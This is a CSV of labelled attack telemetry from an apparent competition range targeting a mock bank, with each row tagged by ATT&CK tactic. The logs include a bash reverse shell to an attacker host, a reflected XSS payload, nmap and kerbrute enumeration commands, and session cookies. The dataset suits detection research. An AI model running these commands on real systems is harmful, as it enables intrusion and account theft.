ID,Host,Host_Type,Event,Tactic,Technique
2019_T07_065,nationals-t7-vdi-win04,Attacker,"{""endtime"":""2019-11-23T22:47:15.232570Z"",""timestamp"":""2019-11-23T22:47:15.232127Z"",""bytes"":1277,""src_mac"":""42:01:0A:00:FE:68"",""src_port"":49403,""bytes_in"":613,""dest_ip"":""10.0.2.101"",""dest_mac"":""42:01:0A:00:FE:01"",""dest_port"":80,""bytes_out"":664,""time_taken"":530,""transport"":""tcp"",""flow_id"":""fc9eb4b7-dd46-4173-a722-56dc67837257"",""src_ip"":""10.0.254.104"",""http_comment"":""HTTP/1.1 301 Moved Permanently"",""http_content_length"":376,""http_content_type"":""text/html; charset=iso-8859-1"",""cookie"":""PHPSESSID=lohnidv2cgvi8gt3d0p3hbfr7i; bauth=bm1BU2thdXNraTdIaWdiWHI3dXAxREpFQjVVa2U4R2xoci8rS0JTWWJhRVdHdGViL0tORm9lMDVnWnExWE8wRHM1c04yRmdYdzQ0bXVwdkpncEJRR0pFTmZ5K1lnNFZwMFhBWjBhZXpVcHR2NUovdncxMzhsaW9IZW5IRFJ4VC8%3D"",""form_data"":""srcacc=23423%22%3E%3Cimg%20src=x%20onerror=alert()%3E"",""site"":""my.dinobank.us"",""http_method"":""GET"",""server"":""Apache/2.4.29 (Ubuntu)"",""status"":301,""uri_query"":""srcacc=23423%22%3E%3Cimg%20src=x%20onerror=alert()%3E"",""uri_path"":""/transfer.php"",""http_user_agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0"",""protocol_stack"":""ip:tcp:http""}",Execution,Command and Scripting Interpreter
2019_T07_066,nationals-t7-bank-bankweb-01,Victim,"{""endtime"":""2019-11-23T22:47:15.223679Z"",""timestamp"":""2019-11-23T22:47:15.223362Z"",""bytes"":1277,""src_mac"":""42:01:0A:00:02:01"",""src_port"":49403,""bytes_in"":613,""dest_ip"":""10.0.2.101"",""dest_mac"":""42:01:0A:00:02:65"",""dest_port"":80,""bytes_out"":664,""time_taken"":1245,""transport"":""tcp"",""flow_id"":""09f1afac-0f88-4fcd-bbe2-b31c913d2aee"",""src_ip"":""10.0.254.104"",""http_comment"":""HTTP/1.1 301 Moved Permanently"",""http_content_length"":376,""http_content_type"":""text/html; charset=iso-8859-1"",""cookie"":""PHPSESSID=lohnidv2cgvi8gt3d0p3hbfr7i; bauth=bm1BU2thdXNraTdIaWdiWHI3dXAxREpFQjVVa2U4R2xoci8rS0JTWWJhRVdHdGViL0tORm9lMDVnWnExWE8wRHM1c04yRmdYdzQ0bXVwdkpncEJRR0pFTmZ5K1lnNFZwMFhBWjBhZXpVcHR2NUovdncxMzhsaW9IZW5IRFJ4VC8%3D"",""form_data"":""srcacc=23423%22%3E%3Cimg%20src=x%20onerror=alert()%3E"",""site"":""my.dinobank.us"",""http_method"":""GET"",""server"":""Apache/2.4.29 (Ubuntu)"",""status"":301,""uri_query"":""srcacc=23423%22%3E%3Cimg%20src=x%20onerror=alert()%3E"",""uri_path"":""/transfer.php"",""http_user_agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0"",""protocol_stack"":""ip:tcp:http""}",Execution,Command and Scripting Interpreter
2019_T07_067,nationals-t7-vdi-kali06,Attacker,root 9471 1 17.5 00:00:00 0.4 35460 79744 pts/0 S 00:02 nmap -sV_-Pn_-T4_10.0.2.0/24,Discovery,Network Service Scanning
2019_T07_068,nationals-t7-vdi-kali06,Attacker,nmap -sV -Pn -T4 10.0.2.0/24,Discovery,Network Service Scanning
2019_T07_069,nationals-t7-vdi-kali04,Attacker,"{""endtime"":""2019-11-23T01:42:38.611443Z"",""timestamp"":""2019-11-23T01:42:38.611306Z"",""bytes"":637,""src_mac"":""42:01:0A:00:FE:CC"",""src_port"":60416,""bytes_in"":102,""dest_ip"":""10.0.2.101"",""dest_mac"":""42:01:0A:00:FE:01"",""dest_port"":80,""bytes_out"":535,""time_taken"":137,""transport"":""tcp"",""flow_id"":""81483550-03dc-41c0-90fc-bf30e47c47f6"",""src_ip"":""10.0.254.204"",""http_comment"":""HTTP/1.1 301 Moved Permanently"",""http_content_length"":321,""http_content_type"":""text/html; charset=iso-8859-1"",""site"":""my.dinobank.us"",""http_method"":""GET"",""server"":""Apache/2.4.29 (Ubuntu)"",""status"":301,""uri_path"":""/account.php"",""http_user_agent"":""gobuster/3.0.1"",""protocol_stack"":""ip:tcp:http""}",Pre-Attack,Pre-Attack
2019_T07_070,nationals-t7-bank-bankweb-01,Victim,"{""endtime"":""2019-11-23T01:42:38.611368Z"",""timestamp"":""2019-11-23T01:42:38.611302Z"",""bytes"":637,""src_mac"":""42:01:0A:00:02:01"",""src_port"":60416,""bytes_in"":102,""dest_ip"":""10.0.2.101"",""dest_mac"":""42:01:0A:00:02:65"",""dest_port"":80,""bytes_out"":535,""time_taken"":66,""transport"":""tcp"",""flow_id"":""017865a3-88b8-4e14-adcc-2827758f1a99"",""src_ip"":""10.0.254.204"",""http_comment"":""HTTP/1.1 301 Moved Permanently"",""http_content_length"":321,""http_content_type"":""text/html; charset=iso-8859-1"",""site"":""my.dinobank.us"",""http_method"":""GET"",""server"":""Apache/2.4.29 (Ubuntu)"",""status"":301,""uri_path"":""/account.php"",""http_user_agent"":""gobuster/3.0.1"",""protocol_stack"":""ip:tcp:http""}",Pre-Attack,Pre-Attack
2019_T07_071,nationals-t7-vdi-kali06,Attacker,root 9471 1 17.5 00:00:00 0.4 35460 79744 pts/0 S 00:02 nmap -sV_-Pn_-T4_10.0.2.0/24,Discovery,Network Service Scanning
2019_T07_072,nationals-t7-vdi-kali06,Attacker,nmap -sV -Pn -T4 10.0.2.0/24,Discovery,Network Service Scanning
2019_T07_073,nationals-t7-vdi-kali04,Attacker,"{""endtime"":""2019-11-23T01:42:38.812994Z"",""timestamp"":""2019-11-23T01:42:38.812869Z"",""bytes"":613,""src_mac"":""42:01:0A:00:FE:CC"",""src_port"":60420,""bytes_in"":94,""dest_ip"":""10.0.2.101"",""dest_mac"":""42:01:0A:00:FE:01"",""dest_port"":80,""bytes_out"":519,""time_taken"":125,""transport"":""tcp"",""flow_id"":""9137c79f-54db-4783-a10a-5399d329d576"",""src_ip"":""10.0.254.204"",""http_comment"":""HTTP/1.1 301 Moved Permanently"",""http_content_length"":313,""http_content_type"":""text/html; charset=iso-8859-1"",""site"":""my.dinobank.us"",""http_method"":""GET"",""server"":""Apache/2.4.29 (Ubuntu)"",""status"":301,""uri_path"":""/css"",""http_user_agent"":""gobuster/3.0.1"",""protocol_stack"":""ip:tcp:http""}","Discovery, Collection",Manual Search for Sensitive Information in Webpages
2019_T07_074,nationals-t7-bank-bankweb-01,Victim,"{""endtime"":""2019-11-23T01:42:38.812922Z"",""timestamp"":""2019-11-23T01:42:38.812873Z"",""bytes"":613,""src_mac"":""42:01:0A:00:02:01"",""src_port"":60420,""bytes_in"":94,""dest_ip"":""10.0.2.101"",""dest_mac"":""42:01:0A:00:02:65"",""dest_port"":80,""bytes_out"":519,""time_taken"":49,""transport"":""tcp"",""flow_id"":""f49ac342-d846-4223-b6c9-c0fa81c1df0e"",""src_ip"":""10.0.254.204"",""http_comment"":""HTTP/1.1 301 Moved Permanently"",""http_content_length"":313,""http_content_type"":""text/html; charset=iso-8859-1"",""site"":""my.dinobank.us"",""http_method"":""GET"",""server"":""Apache/2.4.29 (Ubuntu)"",""status"":301,""uri_path"":""/css"",""http_user_agent"":""gobuster/3.0.1"",""protocol_stack"":""ip:tcp:http""}","Discovery, Collection",Manual Search for Sensitive Information in Webpages
2019_T07_075,nationals-t7-vdi-kali04,Attacker,"{""endtime"":""2019-11-23T01:42:39.004081Z"",""timestamp"":""2019-11-23T01:42:39.003960Z"",""bytes"":610,""src_mac"":""42:01:0A:00:FE:CC"",""src_port"":60462,""bytes_in"":93,""dest_ip"":""10.0.2.101"",""dest_mac"":""42:01:0A:00:FE:01"",""dest_port"":80,""bytes_out"":517,""time_taken"":121,""transport"":""tcp"",""flow_id"":""8295f096-9fa8-4348-9e47-7ea1023e249f"",""src_ip"":""10.0.254.204"",""http_comment"":""HTTP/1.1 301 Moved Permanently"",""http_content_length"":312,""http_content_type"":""text/html; charset=iso-8859-1"",""site"":""my.dinobank.us"",""http_method"":""GET"",""server"":""Apache/2.4.29 (Ubuntu)"",""status"":301,""uri_path"":""/js"",""http_user_agent"":""gobuster/3.0.1"",""protocol_stack"":""ip:tcp:http""}","Discovery, Collection",Manual Search for Sensitive Information in Webpages
2019_T07_076,nationals-t7-bank-bankweb-01,Victim,"{""endtime"":""2019-11-23T01:42:39.004006Z"",""timestamp"":""2019-11-23T01:42:39.003954Z"",""bytes"":610,""src_mac"":""42:01:0A:00:02:01"",""src_port"":60462,""bytes_in"":93,""dest_ip"":""10.0.2.101"",""dest_mac"":""42:01:0A:00:02:65"",""dest_port"":80,""bytes_out"":517,""time_taken"":52,""transport"":""tcp"",""flow_id"":""d642a798-d89f-4a76-aca6-7a6e9378ee78"",""src_ip"":""10.0.254.204"",""http_comment"":""HTTP/1.1 301 Moved Permanently"",""http_content_length"":312,""http_content_type"":""text/html; charset=iso-8859-1"",""site"":""my.dinobank.us"",""http_method"":""GET"",""server"":""Apache/2.4.29 (Ubuntu)"",""status"":301,""uri_path"":""/js"",""http_user_agent"":""gobuster/3.0.1"",""protocol_stack"":""ip:tcp:http""}","Discovery, Collection",Manual Search for Sensitive Information in Webpages
2019_T07_077,nationals-t7-vdi-win06,Attacker,Command start time: 20191123142630 ********************** PS C:\Users\Administrator> dirbuster,Discovery,File and Directory Discovery
2019_T07_078,nationals-t7-vdi-kali06,Attacker,root 9471 1 17.5 00:00:00 0.4 35460 79744 pts/0 S 00:02 nmap -sV_-Pn_-T4_10.0.2.0/24,Discovery,Network Service Scanning
2019_T07_079,nationals-t7-vdi-kali06,Attacker,nmap -sV -Pn -T4 10.0.2.0/24,Discovery,Network Service Scanning
2019_T07_080,nationals-t7-bank-bankweb-01,Victim,www-data 22226 1 0.0 00:00:00 0.0 3036 18372 ? S 00:02 bash -c_bash_-i_>&_/dev/tcp/10.0.254.204/4444_0>&1,Privilege Escalation,Exploitation for Privilege Escalation
2019_T07_081,nationals-t7-vdi-kali06,Attacker,root 9471 1 17.5 00:00:00 0.4 35460 79744 pts/0 S 00:02 nmap -sV_-Pn_-T4_10.0.2.0/24,Discovery,Network Service Scanning
2019_T07_082,nationals-t7-vdi-win04,Attacker,"{""endtime"":""2019-11-23T00:48:09.350883Z"",""timestamp"":""2019-11-23T00:48:09.301963Z"",""bytes"":6562,""src_mac"":""42:01:0A:00:FE:68"",""src_port"":63202,""bytes_in"":685,""dest_ip"":""10.0.2.103"",""dest_mac"":""42:01:0A:00:FE:01"",""dest_port"":80,""bytes_out"":5877,""time_taken"":49002,""transport"":""tcp"",""flow_id"":""2a7e3431-431f-48bd-9c7d-2f804f3f4f3d"",""src_ip"":""10.0.254.104"",""http_comment"":""HTTP/1.1 200 OK"",""http_content_type"":""text/html; charset=utf-8"",""cookie"":"".AspNetCore.Antiforgery.9TtSrW0hzOs=CfDJ8KdmQo56YIZHpepOHtV6mfiPS8Lqj16leB_30SfbKUMRJTUIJ6qssKmW27n1s110B7-ZswAYGM6Ku5VMrD6Kc29oA1A19n179Ut_JDf0FQ7ilQM9uASK-bLJFbq_CyKbjwV43ycw1vtgRBdk_zPupQk"",""site"":""10.0.2.103"",""http_method"":""GET"",""http_referrer"":""http://10.0.2.103/Account/Login?ReturnUrl=%2F"",""server"":""Kestrel"",""status"":200,""uri_path"":""/Account/Register"",""http_user_agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"",""protocol_stack"":""ip:tcp:http""}",Pre-Attack,Pre-Attack
2019_T07_083,nationals-t7-bank-reports-01,Victim,"{""endtime"":""2019-11-23T00:48:09.392980Z"",""timestamp"":""2019-11-23T00:48:09.344219Z"",""bytes"":6562,""src_mac"":""42:01:0A:00:02:01"",""src_port"":63202,""bytes_in"":685,""dest_ip"":""10.0.2.103"",""dest_mac"":""42:01:0A:00:02:67"",""dest_port"":80,""bytes_out"":5877,""time_taken"":48995,""transport"":""tcp"",""flow_id"":""b368f059-3fab-40fd-a696-1bb32d87dad5"",""src_ip"":""10.0.254.104"",""http_comment"":""HTTP/1.1 200 OK"",""http_content_type"":""text/html; charset=utf-8"",""cookie"":"".AspNetCore.Antiforgery.9TtSrW0hzOs=CfDJ8KdmQo56YIZHpepOHtV6mfiPS8Lqj16leB_30SfbKUMRJTUIJ6qssKmW27n1s110B7-ZswAYGM6Ku5VMrD6Kc29oA1A19n179Ut_JDf0FQ7ilQM9uASK-bLJFbq_CyKbjwV43ycw1vtgRBdk_zPupQk"",""site"":""10.0.2.103"",""http_method"":""GET"",""http_referrer"":""http://10.0.2.103/Account/Login?ReturnUrl=%2F"",""server"":""Kestrel"",""status"":200,""uri_path"":""/Account/Register"",""http_user_agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"",""protocol_stack"":""ip:tcp:http""}",Pre-Attack,Pre-Attack
2019_T07_084,nationals-t7-vdi-win04,Attacker,"{""endtime"":""2019-11-23T00:48:42.539129Z"",""timestamp"":""2019-11-23T00:48:42.442336Z"",""bytes"":6504,""src_mac"":""42:01:0A:00:FE:68"",""src_port"":63211,""bytes_in"":671,""dest_ip"":""10.0.2.103"",""dest_mac"":""42:01:0A:00:FE:01"",""dest_port"":80,""bytes_out"":5833,""time_taken"":96912,""transport"":""tcp"",""flow_id"":""9cc195eb-e06a-43ab-947b-8adf1af6cb69"",""src_ip"":""10.0.254.104"",""http_comment"":""HTTP/1.1 200 OK"",""http_content_type"":""text/html; charset=utf-8"",""cookie"":"".AspNetCore.Antiforgery.9TtSrW0hzOs=CfDJ8KdmQo56YIZHpepOHtV6mfiPS8Lqj16leB_30SfbKUMRJTUIJ6qssKmW27n1s110B7-ZswAYGM6Ku5VMrD6Kc29oA1A19n179Ut_JDf0FQ7ilQM9uASK-bLJFbq_CyKbjwV43ycw1vtgRBdk_zPupQk"",""site"":""10.0.2.103"",""http_method"":""GET"",""http_referrer"":""http://10.0.2.103/Account/Register"",""server"":""Kestrel"",""status"":200,""uri_path"":""/Account/Login"",""http_user_agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"",""protocol_stack"":""ip:tcp:http""}",Pre-Attack,Pre-Attack
2019_T07_085,nationals-t7-bank-reports-01,Victim,"{""endtime"":""2019-11-23T00:48:42.581166Z"",""timestamp"":""2019-11-23T00:48:42.484664Z"",""bytes"":6504,""src_mac"":""02:42:DC:0E:9C:EA"",""src_port"":63211,""bytes_in"":671,""dest_ip"":""172.17.0.2"",""dest_mac"":""02:42:AC:11:00:02"",""dest_port"":80,""bytes_out"":5833,""time_taken"":97019,""transport"":""tcp"",""flow_id"":""f9f4c273-44e1-40aa-9adf-6b965b82ccce"",""src_ip"":""10.0.254.104"",""http_comment"":""HTTP/1.1 200 OK"",""http_content_type"":""text/html; charset=utf-8"",""cookie"":"".AspNetCore.Antiforgery.9TtSrW0hzOs=CfDJ8KdmQo56YIZHpepOHtV6mfiPS8Lqj16leB_30SfbKUMRJTUIJ6qssKmW27n1s110B7-ZswAYGM6Ku5VMrD6Kc29oA1A19n179Ut_JDf0FQ7ilQM9uASK-bLJFbq_CyKbjwV43ycw1vtgRBdk_zPupQk"",""site"":""10.0.2.103"",""http_method"":""GET"",""http_referrer"":""http://10.0.2.103/Account/Register"",""server"":""Kestrel"",""status"":200,""uri_path"":""/Account/Login"",""http_user_agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"",""protocol_stack"":""ip:tcp:http""}",Pre-Attack,Pre-Attack
2019_T07_086,nationals-t7-vdi-win04,Attacker,"{""endtime"":""2019-11-23T01:01:29.699960Z"",""timestamp"":""2019-11-23T01:01:29.426819Z"",""bytes"":1414,""src_mac"":""42:01:0A:00:FE:68"",""src_port"":65517,""bytes_in"":1287,""dest_ip"":""10.0.2.103"",""dest_mac"":""42:01:0A:00:FE:01"",""dest_port"":80,""bytes_out"":127,""time_taken"":273316,""transport"":""tcp"",""flow_id"":""9e1aefda-81c2-4d7a-aeed-6d8942c7497a"",""src_ip"":""10.0.254.104"",""http_comment"":""HTTP/1.1 302 Found"",""http_content_length"":0,""cookie"":"".AspNetCore.Antiforgery.9TtSrW0hzOs=CfDJ8KdmQo56YIZHpepOHtV6mfiPS8Lqj16leB_30SfbKUMRJTUIJ6qssKmW27n1s110B7-ZswAYGM6Ku5VMrD6Kc29oA1A19n179Ut_JDf0FQ7ilQM9uASK-bLJFbq_CyKbjwV43ycw1vtgRBdk_zPupQk; .AspNetCore.Identity.Application=CfDJ8KdmQo56YIZHpepOHtV6mfjyDmS7YCB6kj-QRKv_Wg270B5NLgKKLXV8GTnpScl4ULEeW9aSDqBsMK8uyW0N1m7bQPo9qBIzoXlCxd94LejCXaerwDsT5SJqedVJG4QiV4CnroAK0Cxc-PyW7A2Lu3GccSNgF3LkgwM2e8BzparXQPbGOZ-U9JwoZ7iuObLmwpT4Ut2Xa7eV0JsW47nmvGAlutf2DehJIR7KcruqiDajwkaSI5s-59tVUrqMz2rvc-wHjZIVGC6-PNtJH1gvK2Vl-dmYVXK3FKSsk2ER8dijXU3nQcdNeLKVljCsTWE44IwJX2lIsVYXS2bMXYsuLwkKxdB8rbAyQlLCV6DsNvQG4zY8dvmP8zAXtOElJyEftq7Qpa4YkbpmDgWNQrmBTqkDrhygiOgwm4sRiuVpNWUYpXP8ZQK3Qni9bKX7F1ivICkXbSsDEloD110tuc0llpx9X2itCY3fxF1El0UilvkbHJBIWPeUZqeRHg1cwWNnc9HDhTTDPhi0uxQpDbvIe30kJCjCrwZZFjTEFbkrindH-CN1DHOz4BiRlmGCKS02P3lxrnaQMLDxOBOceyHvRSAIOivcwef-s5tNYsm3p5pI"",""site"":""10.0.2.103"",""http_method"":""GET"",""server"":""Kestrel"",""status"":302,""uri_path"":""/Invitations/Accept/1"",""http_user_agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"",""protocol_stack"":""ip:tcp:http""}","Privilege Escalation, Persistence","Exploitation for Privilege Escalation, Account Manipulation"
2019_T07_087,nationals-t7-bank-reports-01,Victim,"{""endtime"":""2019-11-23T01:01:29.742406Z"",""timestamp"":""2019-11-23T01:01:29.469496Z"",""bytes"":1414,""src_mac"":""02:42:DC:0E:9C:EA"",""src_port"":65517,""bytes_in"":1287,""dest_ip"":""172.17.0.2"",""dest_mac"":""02:42:AC:11:00:02"",""dest_port"":80,""bytes_out"":127,""time_taken"":273222,""transport"":""tcp"",""flow_id"":""7f59793d-f1b8-48bc-968c-d891389eec85"",""src_ip"":""10.0.254.104"",""http_comment"":""HTTP/1.1 302 Found"",""http_content_length"":0,""cookie"":"".AspNetCore.Antiforgery.9TtSrW0hzOs=CfDJ8KdmQo56YIZHpepOHtV6mfiPS8Lqj16leB_30SfbKUMRJTUIJ6qssKmW27n1s110B7-ZswAYGM6Ku5VMrD6Kc29oA1A19n179Ut_JDf0FQ7ilQM9uASK-bLJFbq_CyKbjwV43ycw1vtgRBdk_zPupQk; .AspNetCore.Identity.Application=CfDJ8KdmQo56YIZHpepOHtV6mfjyDmS7YCB6kj-QRKv_Wg270B5NLgKKLXV8GTnpScl4ULEeW9aSDqBsMK8uyW0N1m7bQPo9qBIzoXlCxd94LejCXaerwDsT5SJqedVJG4QiV4CnroAK0Cxc-PyW7A2Lu3GccSNgF3LkgwM2e8BzparXQPbGOZ-U9JwoZ7iuObLmwpT4Ut2Xa7eV0JsW47nmvGAlutf2DehJIR7KcruqiDajwkaSI5s-59tVUrqMz2rvc-wHjZIVGC6-PNtJH1gvK2Vl-dmYVXK3FKSsk2ER8dijXU3nQcdNeLKVljCsTWE44IwJX2lIsVYXS2bMXYsuLwkKxdB8rbAyQlLCV6DsNvQG4zY8dvmP8zAXtOElJyEftq7Qpa4YkbpmDgWNQrmBTqkDrhygiOgwm4sRiuVpNWUYpXP8ZQK3Qni9bKX7F1ivICkXbSsDEloD110tuc0llpx9X2itCY3fxF1El0UilvkbHJBIWPeUZqeRHg1cwWNnc9HDhTTDPhi0uxQpDbvIe30kJCjCrwZZFjTEFbkrindH-CN1DHOz4BiRlmGCKS02P3lxrnaQMLDxOBOceyHvRSAIOivcwef-s5tNYsm3p5pI"",""site"":""10.0.2.103"",""http_method"":""GET"",""server"":""Kestrel"",""status"":302,""uri_path"":""/Invitations/Accept/1"",""http_user_agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"",""protocol_stack"":""ip:tcp:http""}","Privilege Escalation, Persistence","Exploitation for Privilege Escalation, Account Manipulation"
2019_T07_088,nationals-t7-vdi-kali06,Attacker,nmap -sV -Pn -T4 10.0.2.0/24,Discovery,Network Service Scanning
2019_T07_089,nationals-t7-vdi-kali06,Attacker,root 23799 1 6.0 00:00:00 0.2 15728 324828 pts/0 S 00:01 nmap -sU_-sT_-p0-65535_10.0.1.0/24,Discovery,Network Service Scanning
2019_T07_090,nationals-t7-vdi-kali01,Attacker,root 9203 1 1.6 00:00:00 0.2 16596 295500 pts/0 S 00:03 nmap -sU_-sT_-p-_10.0.11.0/24_-o_11sub.nmap,"Discovery, Collection","Network Service Scanning, Automated Collection"
2019_T07_091,nationals-t7-vdi-kali01,Attacker,nmap -sU -sT -p- 10.0.11.0/24 -o 11sub.nmap,"Discovery, Collection","Network Service Scanning, Automated Collection"
2019_T07_092,nationals-t7-vdi-kali03,Attacker,root 8187 0 0.5 00:00:00 0.2 15552 32768 pts/0 S 00:08 nmap 10.0.12.0/24,Discovery,Network Service Scanning
2019_T07_093,nationals-t7-vdi-kali03,Attacker,nmap 10.0.12.0/24,Discovery,Network Service Scanning
2019_T07_094,nationals-t7-vdi-kali06,Attacker,root 10503 0 5.7 00:00:00 0.4 35596 79428 pts/0 S 00:08 nmap -sV_-T4_10.0.10.0/24,Discovery,Network Service Scanning
2019_T07_095,nationals-t7-vdi-kali06,Attacker,nmap -sV -T4 10.0.10.0/24,Discovery,Network Service Scanning
2019_T07_096,nationals-t7-vdi-kali06,Attacker,root 23799 1 6.0 00:00:00 0.2 15728 324828 pts/0 S 00:01 nmap -sU_-sT_-p0-65535_10.0.1.0/24,Discovery,Network Service Scanning
2019_T07_097,nationals-t7-vdi-kali02,Attacker,nano ~\new_users.txt,Pre-Attack,Pre-Attack
2019_T07_098,nationals-t7-vdi-kali02,Attacker,./kerbrute_linux_amd64 userenum --dc 10.0.10.100 -d DINO ~/new_users.txt,Credential Access,Brute Force
2019_T08_001,nationals-t8-vdi-kali05,Attacker,root 21697 0 6.5 00:00:00 0.5 41592 86196 pts/0 S 00:08 nmap -sC_-sV_-oA_2_10.0.2.0/24,Discovery,Network Service Scanning
2019_T08_002,nationals-t8-vdi-kali05,Attacker,nmap -sC -sV -oA 2 10.0.2.0/24,Discovery,Network Service Scanning
2019_T08_003,nationals-t8-vdi-kali06,Attacker,"{""endtime"":""2019-11-23T14:29:33.916248Z"",""timestamp"":""2019-11-23T14:29:33.907960Z"",""bytes"":3682,""src_ip"":""10.0.254.206"",""src_mac"":""42:01:0A:00:FE:CE"",""src_port"":38886,""canceled"":1,""connection"":""10.0.2.100:5432"",""client_rtt"":28,""client_rtt_packets"":1,""client_rtt_sum"":28,""ack_packets_in"":3,""bytes_in"":1483,""data_packets_in"":6,""duplicate_packets_in"":0,""missing_packets_in"":0,""packets_in"":10,""app"":""ssl"",""server_rtt"":125,""server_rtt_packets"":1,""server_rtt_sum"":125,""dest_ip"":""10.0.2.100"",""dest_mac"":""42:01:0A:00:FE:01"",""dest_port"":5432,""ack_packets_out"":2,""bytes_out"":2199,""data_packets_out"":5,""duplicate_packets_out"":0,""missing_packets_out"":0,""packets_out"":7,""tcp_status"":0,""time_taken"":8316,""flow_id"":""d8299f90-4d68-4c8b-a1e4-3c1d596a1529"",""protocol_stack"":""ip:tcp:postgres:ssl:unknown"",""initial_rtt"":260}",Lateral Movement,Valid Accounts
2019_T08_004,nationals-t8-bank-core-01,Victim,"{""endtime"":""2019-11-23T14:29:34.254952Z"",""timestamp"":""2019-11-23T14:29:34.246717Z"",""bytes"":3682,""src_ip"":""10.0.254.206"",""src_mac"":""42:01:0A:00:02:01"",""src_port"":38886,""canceled"":1,""connection"":""10.0.2.100:5432"",""client_rtt"":174,""client_rtt_packets"":1,""client_rtt_sum"":174,""ack_packets_in"":3,""bytes_in"":1483,""data_packets_in"":6,""duplicate_packets_in"":0,""missing_packets_in"":0,""packets_in"":10,""app"":""ssl"",""server_rtt"":20,""server_rtt_packets"":1,""server_rtt_sum"":20,""dest_ip"":""10.0.2.100"",""dest_mac"":""42:01:0A:00:02:64"",""dest_port"":5432,""ack_packets_out"":2,""bytes_out"":2199,""data_packets_out"":5,""duplicate_packets_out"":0,""missing_packets_out"":0,""packets_out"":7,""tcp_status"":0,""time_taken"":8409,""flow_id"":""a9870fcd-d0dc-4937-8228-4207fdba0b70"",""protocol_stack"":""ip:tcp:postgres:ssl:unknown"",""initial_rtt"":245}",Lateral Movement,Valid Accounts
2019_T08_005,nationals-t8-vdi-kali06,Attacker,root 7915 0 0.3 00:00:00 0.1 13188 32672 pts/0 S 00:08 psql -h_10.0.2.100_-U_postgres,Lateral Movement,Valid Accounts
2019_T08_006,nationals-t8-vdi-kali02,Attacker,root 16196 1 9.2 00:00:00 0.6 47744 62440 pts/0 S 00:08 nmap -sC_-sV_-n_-oX_1_range.xml_10.0.1.0/24,"Discovery, Collection","Network Service Scanning, Automated Collection"
2019_T08_007,nationals-t8-vdi-kali02,Attacker,nmap -sC -sV -n -oX 1_range.xml 10.0.1.0/24,"Discovery, Collection","Network Service Scanning, Automated Collection"
2019_T08_008,nationals-t8-vdi-kali01,Attacker,root 19372 1 0.0 00:00:00 0.0 2800 24224 pts/4 S 00:02 ftp 10.0.1.12,Lateral Movement,Valid Accounts
2019_T08_009,nationals-t8-vdi-kali01,Attacker,"{""endtime"":""2019-11-23T20:32:52.873617Z"",""timestamp"":""2019-11-23T20:32:44.863299Z"",""bytes"":1621,""src_ip"":""10.0.254.201"",""src_mac"":""42:01:0A:00:FE:C9"",""src_port"":46092,""connection"":""10.0.1.12:21"",""client_rtt"":8395,""client_rtt_packets"":5,""client_rtt_sum"":41975,""ack_packets_in"":7,""bytes_in"":831,""data_packets_in"":4,""duplicate_packets_in"":0,""missing_packets_in"":0,""packets_in"":12,""app"":""ftp"",""server_rtt"":146,""server_rtt_packets"":1,""server_rtt_sum"":146,""dest_ip"":""10.0.1.12"",""dest_mac"":""42:01:0A:00:FE:01"",""dest_port"":21,""ack_packets_out"":3,""bytes_out"":790,""data_packets_out"":5,""duplicate_packets_out"":0,""missing_packets_out"":0,""packets_out"":8,""tcp_status"":0,""time_taken"":8018713,""flow_id"":""44ca64a7-46db-4549-a8a9-6c32695693bb"",""protocol_stack"":""ip:tcp:ftp"",""initial_rtt"":1684}",Lateral Movement,Valid Accounts
